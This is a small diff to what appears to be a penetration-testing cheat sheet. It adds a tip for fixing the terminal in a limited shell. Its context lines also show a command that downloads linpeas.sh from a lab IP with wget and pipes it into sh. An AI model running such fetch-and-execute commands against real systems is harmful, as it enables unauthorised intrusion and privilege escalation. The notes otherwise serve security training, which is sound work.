@@ -22,6 +22,10 @@ reset
 xterm-256color
 xterm
 ```
+##### Got a dumb shell and cant open nano
+```bash
+export TERM=xterm
+```
 ##### wget in ram
 ```bash
 Wget -O - http://192.168.49.66/linpeas.sh | sh
